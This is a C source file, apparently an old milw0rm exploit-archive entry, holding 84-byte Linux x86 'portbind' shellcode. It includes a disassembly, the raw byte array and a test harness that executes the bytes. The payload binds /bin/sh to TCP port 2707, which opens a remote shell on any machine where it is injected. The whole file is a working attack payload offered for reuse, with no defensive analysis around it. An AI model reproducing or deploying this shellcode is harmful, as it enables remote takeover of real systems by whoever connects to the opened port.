/*
 * Shellcode - portbind (84 bytes)
 *
 *  Copyright (c) 2002 Giuseppe Gottardi 'oveRet' <overet@securitydate.it>
 *
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *
 * 8048304:	6a 66                	push   $0x66
 * 8048306:	58                   	pop    %eax
 * 8048307:	6a 01                	push   $0x1
 * 8048309:	5b                   	pop    %ebx
 * 804830a:	99                   	cltd
 * 804830b:	52                   	push   %edx
 * 804830c:	53                   	push   %ebx
 * 804830d:	6a 02                	push   $0x2
 * 804830f:	89 e1                	mov    %esp,%ecx
 * 8048311:	cd 80                	int    $0x80
 * 8048313:	52                   	push   %edx
 * 8048314:	43                   	inc    %ebx
 * 8048315:	68 ff 02 0a 93       	push   $0x930a02ff
 * 804831a:	89 e1                	mov    %esp,%ecx
 * 804831c:	6a 10                	push   $0x10
 * 804831e:	51                   	push   %ecx
 * 804831f:	50                   	push   %eax
 * 8048320:	89 e1                	mov    %esp,%ecx
 * 8048322:	89 c6                	mov    %eax,%esi
 * 8048324:	b0 66                	mov    $0x66,%al
 * 8048326:	cd 80                	int    $0x80
 * 8048328:	43                   	inc    %ebx
 * 8048329:	43                   	inc    %ebx
 * 804832a:	b0 66                	mov    $0x66,%al
 * 804832c:	cd 80                	int    $0x80
 * 804832e:	52                   	push   %edx
 * 804832f:	56                   	push   %esi
 * 8048330:	89 e1                	mov    %esp,%ecx
 * 8048332:	43                   	inc    %ebx
 * 8048333:	b0 66                	mov    $0x66,%al
 * 8048335:	cd 80                	int    $0x80
 * 8048337	89 d9			mov    %ebx,%ecx
 * 8048339:	89 c3                	mov    %eax,%ebx
 * 804833b:	b0 3f                	mov    $0x3f,%al
 * 804833d:	49                   	dec    %ecx
 * 804833e:	cd 80                	int    $0x80
 * 8048340:	41                   	inc    %ecx
 * 8048341:	e2 f8                	loop   804833b
 * 8048343:	52                   	push   %edx
 * 8048344:	68 6e 2f 73 68       	push   $0x68732f6e
 * 8048349:	68 2f 2f 62 69       	push   $0x69622f2f
 * 804834e:	89 e3                	mov    %esp,%ebx
 * 8048350:	52                   	push   %edx
 * 8048351:	53                   	push   %ebx
 * 8048352:	89 e1                	mov    %esp,%ecx
 * 8048354:	b0 0b                	mov    $0xb,%al
 * 8048356:	cd 80                	int    $0x80
 *
*/

#include <stdio.h>
#define L_PORT "\x0a\x93"	/* Port 2707 */

char shellcode[] = "\x6a\x66\x58\x6a\x01\x5b\x99\x52\x53\x6a\x02\x89"
                   "\xe1\xcd\x80\x52\x43\x68\xff\x02"L_PORT"\x89\xe1"
                   "\x6a\x10\x51\x50\x89\xe1\x89\xc6\xb0\x66\xcd\x80"
                   "\x43\x43\xb0\x66\xcd\x80\x52\x56\x89\xe1\x43\xb0"
                   "\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80"
                   "\x41\xe2\xf8\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
                   "\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{
	void (*f)();
	(long) f = &shellcode;
	fprintf(stdout, "lenght: %d bytes\n", sizeof(shellcode) - 1);
	f();
}

// milw0rm.com [2006-07-04]